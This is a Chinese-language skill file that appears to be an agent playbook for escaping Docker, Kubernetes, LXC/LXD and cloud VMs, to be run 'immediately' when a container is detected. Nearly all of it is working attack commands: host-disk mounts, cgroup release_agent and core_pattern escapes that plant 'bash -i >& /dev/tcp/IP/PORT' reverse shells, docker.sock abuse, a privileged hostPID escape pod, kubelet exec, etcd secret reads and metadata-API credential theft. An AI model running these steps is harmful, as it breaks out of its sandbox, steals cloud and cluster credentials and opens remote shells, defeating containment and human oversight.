---
name: 'container-escape'
description: '容器 & K8s 逃逸：Docker特权/挂载→K8s SA token→RBAC→ETCD→LXC/LXD→Cloud IMDS。含决策树。'
whenToUse: '检测到容器/K8s 环境时：Docker 特权/挂载→K8s SA token→RBAC→ETCD→LXC/LXD→Cloud IMDS。'
metadata: { domain: linux, tier: T1 }
---

# 容器 & K8s 逃逸

> 🔴 **检测到容器环境后立即执行。先判断类型 (Docker/LXC/K8s) 再选攻击路径。**

## 0. 容器检测

```
[ ] ls -la /.dockerenv                        # Docker 标志文件
[ ] cat /proc/1/cgroup | grep -i 'docker\|lxc\|kubepods\|libpod'
[ ] cat /proc/1/environ | tr '\0' '\n'
[ ] id | grep -E "docker|lxc|lxd"              # -E: | = OR, 不用 \
[ ] mount | grep -E 'overlay|docker|kube'
[ ] hostname → 是否 HEX 字符串 (Docker 默认)
[ ] ip a → 是否有 docker0/cni0/flannel 网桥
[ ] ls /var/run/secrets/kubernetes.io/        # K8s Service Account token
```

---

## 1. Docker 逃逸

### 1.1 Privileged 容器 🔴 最优先

```
# 检测: capsh --print | grep -q cap_sys_admin
# 有 SYS_ADMIN → 以下全部可行

# 方法 1: 挂载宿主机磁盘
fdisk -l                                      # 找到宿主机磁盘 /dev/sda
mkdir /mnt/host; mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash

# 方法 2: cgroup release_agent (🔴 cgroup v1 only! v2 不支持)
# 先检测: stat -fc %T /sys/fs/cgroup → cgroup2fs = v2 不可行
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null \
  || mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
# 🔴 release_agent 需要宿主机路径！写脚本到容器根目录 /cmd，宿主机路径 = upperdir/cmd
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/bash' > /cmd                 # 🔴 必须是 bash!/bin/sh 不支持 /dev/tcp
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /cmd
chmod +x /cmd
# 触发: sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# 方法 3: nsenter 直接进宿主机 namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### 1.2 Docker Socket 挂载

```
[ ] ls /var/run/docker.sock → 存在 → 🎯 完全控制 Docker
    docker -H unix:///var/run/docker.sock ps
    docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

[ ] 通过 Docker API (TCP:2375/2376)
    curl http://IP:2375/containers/json
    docker -H tcp://IP:2375 run -v /:/host -it alpine chroot /host
```

### 1.3 Capabilities 滥用

```
[ ] capsh --print

# CAP_SYS_ADMIN → mount / cgroup / nsenter (见 1.1)
# CAP_SYS_PTRACE → 注入宿主机进程
# CAP_SYS_MODULE → insmod 内核模块
# CAP_NET_RAW    → ARP 欺骗宿主机
# CAP_DAC_READ_SEARCH → 绕过文件读权限
```

### 1.4 共享 Namespace

```
# host pid namespace
[ ] ls /proc/ → 能看到宿主机进程? → nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# host network
[ ] ip a → 看到 docker0? → 可访问宿主机网络 → 攻击宿主机服务

# host IPC
[ ] ipcs -a → 能看到宿主机共享内存?
```

### 1.5 敏感挂载点

```
mount | grep -E '/proc|/sys|/var/run|/dev'
# /proc:/proc (rw) → nsenter 逃逸
# /:/host → chroot /host
# /var/run/docker.sock 挂载
```

### 1.6 CVE 逃逸
```
# CVE-2019-5736: runc <1.0-rc6 → 容器内写 /proc/self/exe 覆盖宿主机 runc
# CVE-2024-21626 (Leaky Vessels): runc WORKDIR fd 泄露 → 宿主机文件访问
# CVE-2022-0492: cgroup v1 release_agent 无需 CAP_SYS_ADMIN (旧内核未修)
# CVE-2025-9074: Docker Desktop ≤4.44.2 → 容器内 mount 宿主机资源
```

### 1.7 core_pattern 逃逸 (rw /proc)
```
# 条件: /proc/sys/kernel/core_pattern 可写 + CAP_SYS_ADMIN
# 🔴 core_pattern 路径必须是宿主机路径！先获取 host_path（同 release_agent）
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "|$host_path/pwn.sh" > /proc/sys/kernel/core_pattern
echo '#!/bin/bash' > /pwn.sh
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /pwn.sh
chmod +x /pwn.sh
# → 触发 core dump: killall -ABRT someproc → 以 root 执行 /pwn.sh
```

### 1.8 /proc/1/root 快捷逃逸
```
# 🔴 前提: hostPID 共享或能找到宿主机进程的 PID
# 容器内 PID 1 是容器 init → 它的 root 就是容器 root → 不是逃逸
# hostPID 共享时 → 宿主机 init 在某个 PID → ls /proc/<HOST_INIT_PID>/root/
ls /proc/1/root/ → 如果显示宿主机 / 而非容器 / ? → chroot /proc/<PID>/root /bin/bash
# 🔴 Docker 默认 seccomp 可能阻止 chroot → 优先试 release_agent 而非此方法
```

---

## 2. K8s Pod 逃逸

### 2.1 Service Account Token 滥用

```
[ ] ls /var/run/secrets/kubernetes.io/serviceaccount/
[ ] cat /var/run/secrets/kubernetes.io/serviceaccount/token

# kubectl + token
kubectl --token=$(cat token) --server=https://kubernetes.default.svc --insecure-skip-tls-verify auth can-i --list

# 枚举权限
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get nodes

# RBAC 滥用: 可创建 pod → 挂载宿主机 → 逃逸
kubectl apply -f evil-pod.yaml
```

### 2.2 K8s RBAC 提权

```
[ ] kubectl auth can-i create pods --all-namespaces → yes → 创建特权 pod
[ ] kubectl auth can-i create roles --all-namespaces → yes → 添加权限
[ ] kubectl auth can-i get secrets     → yes → 读所有 secrets
[ ] kubectl auth can-i "*" "*"         → yes → 集群 admin!
```

### 2.3 宿主机逃逸（通过 Pod 创建）

```yaml
apiVersion: v1
kind: Pod
spec:
  hostPID: true              # 🔴 必须！否则 nsenter 找不到宿主机进程
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "nsenter --target 1 --mount --uts --ipc --net --pid -- bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

### 2.4 kubelet API 直接访问
```
# kubelet 默认 10250 端口 — 从 Pod 内访问节点 IP
curl -k https://<NODE_IP>:10250/pods
# → 列出所有 pod → 找到目标 pod → exec
curl -k -XPOST https://<NODE_IP>:10250/run/<NS>/<POD>/<CONTAINER> -d "cmd=id"
# 🔴 kubelet 未加固 → 直接 exec 任意 pod 的容器
```

### 2.5 ETCD 访问

```
[ ] env | grep ETCD → ETCDCTL_ENDPOINTS / certs
    etcdctl --endpoints=<...> get / --prefix --keys-only | grep secrets
    etcdctl get /registry/secrets/<ns>/<secret>
```

---

## 3. LXC/LXD 逃逸

```
[ ] id | grep lxd → LXD 组 → 可创建 privileged 容器 → 挂载宿主机
    lxc init ubuntu:22.04 escape -c security.privileged=true
    lxc config device add escape host disk source=/ path=/mnt/root recursive=true
    lxc start escape; lxc exec escape bash

[ ] 已安装 LXD snap → /snap/bin/lxc
```

---

## 4. Cloud VM 逃逸（元数据 API）

```
# AWS IMDSv1
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

# AWS IMDSv2 (需要 token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Azure IMDS
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com"

# GCP
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```

---

## 5. 快速优先级

| 优先级 | 条件 | 方法 |
|--------|------|------|
| 🔴 0 | CVE 逃逸 | runc (CVE-2019-5736/CVE-2024-21626) / Docker Desktop (CVE-2025-9074) / CVE-2022-0492 |
| 🔴 1 | Privileged 容器 | mount 宿主机 / release_agent / nsenter / fdisk |
| 🔴 2 | Docker socket 挂载 | docker run -v /:/host |
| 🔴 3 | Cap SYS_ADMIN | cgroup release_agent / core_pattern (cgroup v1 only!) |
| 🔴 4 | K8s SA token + create pods | 创建特权 pod (必须加 hostPID!) |
| 🔴 5 | hostPID | nsenter -t 1 |
| 🔴 6 | /proc/1/root | chroot /proc/1/root /bin/bash |
| 🟠 7 | kubelet 10250 | 直接 exec 其他 pod |
| 🟠 8 | Cloud IMDS | curl metadata → IAM 角色 |
| 🟡 9 | LXD 组 | privileged 容器 |

## 反模式

| ❌ 禁止 | ✅ 正确 |
|--------|--------|
| ❌ 容器内跑 linpeas 浪费时间 | ✅ 先查 privileged/capabilities/socket |
| ❌ K8s 中找不到 kubectl 就放弃 | ✅ 用 curl + SA token 直接调 API |
| ❌ 忽略 /var/run/docker.sock | ✅ 这是最高危的逃逸路径 |
